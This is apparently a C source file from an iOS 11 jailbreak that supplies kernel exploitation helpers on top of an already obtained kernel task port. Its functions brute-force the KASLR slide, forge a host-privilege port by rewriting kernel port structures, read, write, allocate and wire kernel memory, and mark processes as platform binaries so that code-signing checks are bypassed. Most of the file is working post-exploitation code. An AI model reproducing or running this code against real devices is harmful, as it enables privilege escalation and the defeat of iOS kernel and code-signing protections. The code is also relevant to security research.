#include <stdio.h>
#include <stdlib.h>

#include <mach/mach.h>
#include "kutils.h"
#include "kernel_memory.h"
#include "offsets.h"
#include "patchfinder64og.h"
#include "codesign.h"
#include "offsetss3.h"
#include "offsetsSP.h"
#include "parameters.h"
#include "kernel_slide.h"
#include "KernelUtils.h"
#include "kernel_memorySP.h"
#include "exploit_additions.h"

//#include "../../headers/jelbrekLib.h"
//#include "../../post-exploit/electra.h"

//extern mach_port_t tfpzero;

uint64_t cached_task_self_addr = 0;
uint64_t task_self_addr() {
    if (cached_task_self_addr == 0) {
        cached_task_self_addr = find_port(mach_task_self());
        printf("task self: 0x%llx\n", cached_task_self_addr);
    }
    return cached_task_self_addr;
}
uint64_t get_address_of_port(pid_t pid, mach_port_t port)
{
    uint64_t proc_struct_addr = get_proc_struct_for_pid(pid);
    uint64_t task_addr = rk64SP(proc_struct_addr + koffsetS3(KSTRUCT_OFFSET_PROC_TASK));
    uint64_t itk_space = rk64SP(task_addr + koffsetS3(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = rk64SP(itk_space + koffsetS3(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint64_t port_addr = rk64SP(is_table + (port_index * sizeof_ipc_entry_t));
    return port_addr;
}

uint64_t ipc_space_kernel() {
    return rk64SP(task_self_addr() + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
}



uint64_t find_kernel_base() {
    printf("[*] Bruteforcing kaslr slide\n");
    
#define slid_base  base+slide
    uint64_t base = 0xFFFFFFF007004000; // unslid kernel base on iOS 11
    uint32_t slide = 0x21000000; // maximum value the kaslr slide can have
    uint32_t data = rk32SP(slid_base); // the data our address points to
    
    for(;;) { /* keep running until we find the "__text" string
               string must be less than 0x2000 bytes ahead of the kernel base
               if it's not there the loop will go again */
        
        while (data != 0xFEEDFACF) { // find the macho header
            slide -= 0x200000;
            data = rk32SP(slid_base);
        }
        
        printf("[*] Found 0xfeedfacf header at 0x%llx, is that correct?\n", slid_base);
        
        char buf[0x120];
        for (uint64_t addr = slid_base; addr < slid_base + 0x2000; addr += 4  /* 64 bits / 8 bits / byte = 8 bytes */) {
            kernel_read(addr, buf, 0x120); // read 0x120 bytes into a char buffer
            
            if (!strcmp(buf, "__text") && !strcmp(buf + 16, "__PRELINK_TEXT")) { // found it!
                printf("\t[+] Yes! Found __text and __PRELINK_TEXT!\n");
                printf("\t[i] kernel base at 0x%llx\n", slid_base);
                printf("\t[i] kaslr slide is 0x%x\n", slide);
                printf("\t[i] kernel header is 0x%x\n", rk32SP(slid_base));
                return slid_base;
            }
            data = 0;
        }
        printf("\t[-] Nope. Can't find __text and __PRELINK_TEXT, trying again!\n");
    }
    return 0;
    
}

mach_port_t fake_host_priv_port = MACH_PORT_NULL;

// build a fake host priv port
mach_port_t fake_host_priv() {
    if (fake_host_priv_port != MACH_PORT_NULL) {
        return fake_host_priv_port;
    }
    // get the address of realhost:
    uint64_t hostport_addr = find_port(mach_host_self());
    uint64_t realhost = rk64SP(hostport_addr + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    // allocate a port
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (err != KERN_SUCCESS) {
        printf("failed to allocate port\n");
        return MACH_PORT_NULL;
    }
    
    // get a send right
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    
    // locate the port
    uint64_t port_addr = find_port(port);
    
    // change the type of the port
#define IKOT_HOST_PRIV 4
#define IO_ACTIVE   0x80000000
    wk32SP(port_addr + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_HOST_PRIV);
    
    // change the space of the port
    wk64SP(port_addr + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), ipc_space_kernel());
    
    // set the kobject
    wk64SP(port_addr + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), realhost);
    
    fake_host_priv_port = port;
    
    return port;
}

size_t kread(uint64_t where, void *p, size_t size) {
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(tfpzero, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
        if (rv || sz == 0) {
            fprintf(stderr, "[e] error reading kernel @%p\n", (void *)(offset + where));
            break;
        }
        offset += sz;
    }
    return offset;
}

size_t kwrite(uint64_t where, const void *p, size_t size) {
    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(tfpzero, where + offset, (mach_vm_offset_t)p + offset, (mach_msg_type_number_t)chunk);
        if (rv) {
            fprintf(stderr, "[e] error writing kernel @%p\n", (void *)(offset + where));
            break;
        }
        offset += chunk;
    }
    return offset;
}

uint64_t kalloc(vm_size_t size) {
    mach_vm_address_t address = 0;
    mach_vm_allocate(tfpzero, (mach_vm_address_t *)&address, size, VM_FLAGS_ANYWHERE);
    return address;
}

uint64_t kalloc_wired(uint64_t size) {
    kern_return_t err;
    mach_vm_address_t addr = 0;
    mach_vm_size_t ksize = round_page_kernel(size);
    
    printf("vm_kernel_page_size: %lx\n", vm_kernel_page_size);
    
    err = mach_vm_allocate(tfpzero, &addr, ksize+0x4000, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) {
        printf("unable to allocate kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
        usleep(3);
        return 0;
    }
    
    printf("allocated address: %llx\n", addr);
    
    addr += 0x3fff;
    addr &= ~0x3fffull;
    
    printf("address to wire: %llx\n", addr);
    
    err = mach_vm_wire(fake_host_priv(), tfpzero, addr, ksize, VM_PROT_READ|VM_PROT_WRITE);
    if (err != KERN_SUCCESS) {
        printf("unable to wire kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
        usleep(3);
        return 0;
    }
    return addr;
}

void kfree(mach_vm_address_t address, vm_size_t size){
    mach_vm_deallocate(tfpzero, address, size);
}

// thx Siguza
typedef struct {
    uint64_t prev;
    uint64_t next;
    uint64_t start;
    uint64_t end;
} kmap_hdr_t;

uint64_t zm_fix_addr(uint64_t addr) {
    static kmap_hdr_t zm_hdr = {0, 0, 0, 0};
    
    if (zm_hdr.start == 0) {
        // xxx rk64(0) ?!
        uint64_t zone_map = find_zone_map1();
        // hdr is at offset 0x10, mutexes at start
        size_t r = kread(zone_map + 0x10, &zm_hdr, sizeof(zm_hdr));
        printf("zm_range: 0x%llx - 0x%llx (read 0x%zx, exp 0x%zx)\n", zm_hdr.start, zm_hdr.end, r, sizeof(zm_hdr));
        
        if (r != sizeof(zm_hdr) || zm_hdr.start == 0 || zm_hdr.end == 0) {
            printf("kread of zone_map failed!\n");
            exit(1);
        }
        
        if (zm_hdr.end - zm_hdr.start > 0x100000000) {
            printf("zone_map is too big, sorry.\n");
            exit(1);
        }
    }
    
    uint64_t zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff);
    
    return zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp;
}

void set_csblob(uint64_t proc) {
    uint64_t textvp = rk64SP(proc + koffsetS3(KSTRUCT_OFFSET_PROC_TEXT_VP));///off_p_textvp); //vnode of executable
    
    #define TF_PLATFORM 0x400
    
    uint64_t task = rk64SP(proc + koffsetS3(KSTRUCT_OFFSET_PROC_TASK));///SPkoffset(SPKSTRUCT_OFFSET_PROC_TASK));//off_task);
    uint32_t t_flags = rk32SP(task + koffsetS3(KSTRUCT_OFFSET_TASK_TFLAGS));//off_t_flags);
    t_flags |= TF_PLATFORM;
    
    wk32SP(task+koffsetS3(KSTRUCT_OFFSET_TASK_TFLAGS), t_flags);
    //    wk32SP(task+off_t_flags, t_flags);

    if (textvp != 0){
        uint32_t vnode_type_tag = rk32SP(textvp + off_v_type);//SPkoffset(SPKSTRUCT_OFFSET_VNODE_V_TYPE));
        uint16_t vnode_type = vnode_type_tag & 0xffff;
        
        if (vnode_type == 1){
            uint64_t ubcinfo = rk64SP(textvp + off_v_ubcinfo);
            
            uint64_t csblobs = rk64SP(ubcinfo + off_ubcinfo_csblobs);
            while (csblobs != 0){
                
                unsigned int csb_platform_binary = rk32SP(csblobs + off_csb_platform_binary);
                
                wk32SP(csblobs + off_csb_platform_binary, 1);
                
                csb_platform_binary = rk32SP(csblobs + off_csb_platform_binary);
                csblobs = rk64SP(csblobs);
            }
        }
    }
}

uint32_t find_pid_of_proc(const char *proc_name) {
    //    uint64_t itk_space = kernel_read64(task + OFFSET(task, itk_space));

    uint64_t proc = rk64SP(find_allproc1());
    while (proc) {
        uint32_t pid = (uint32_t)rk32SP(proc + OFFSET(proc, p_pid));//koffsetS3(KSTRUCT_OFFSET_PROC_PID));//off_p_pid);
        char name[40] = {0};
        kread(proc+0x268, name, 20);
        if (strstr(name, proc_name)){
            return pid;
        }
        proc = rk64SP(proc);
    }
    return 0;
}

uint64_t get_proc_struct_for_pid(pid_t proc_pid) {
    uint64_t proc = rk64SP(find_allproc1());
    while (proc) {
        uint32_t pid = (uint32_t)rk32SP(proc + OFFSET(proc, p_pid));//koffsetS3(KSTRUCT_OFFSET_PROC_PID));//offsetof_p_pid);
        if (pid == proc_pid){
            printf("our pids proc struct: %llx\n",proc);

            
            return proc;
        }
        proc = rk64SP(proc);

        //proc = rk64(proc + koffset(KSTRUCT_OFFSET_PROC_P_LIST));

    }
    return 0;

}
